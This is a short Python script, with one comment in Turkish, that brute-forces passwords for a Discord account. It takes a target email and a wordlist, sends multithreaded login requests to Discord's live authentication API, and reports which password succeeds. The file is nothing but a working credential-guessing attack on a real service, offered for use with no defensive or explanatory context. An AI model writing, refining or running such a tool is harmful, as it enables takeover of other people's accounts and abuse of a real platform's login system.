import requests
import threading
from queue import Queue

url = "https://discord.com/api/v9/auth/login"
max_threads = 2  # Maksimum eşzamanlı işlem sayısı

def login(email, password, result_queue):
    data = {
        "login": email,
        "password": password
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        result_queue.put(f"[+] Password found: {password}")
    else:
        result_queue.put(f"[-] Password not found: {password}")

def brute_force(email, wordlist):
    with open(wordlist, "r") as file:
        password_queue = Queue()
        result_queue = Queue()
        
        for password in file:
            password_queue.put(password.strip())
        
        threads = []
        for _ in range(max_threads):
            t = threading.Thread(target=brute_worker, args=(email, password_queue, result_queue))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        while not result_queue.empty():
            print(result_queue.get())

def brute_worker(email, password_queue, result_queue):
    while not password_queue.empty():
        password = password_queue.get()
        login(email, password, result_queue)

if __name__ == "__main__":
    email = input("Enter email: ")
    wordlist = input("Enter wordlist path: ")
    brute_force(email, wordlist)
    
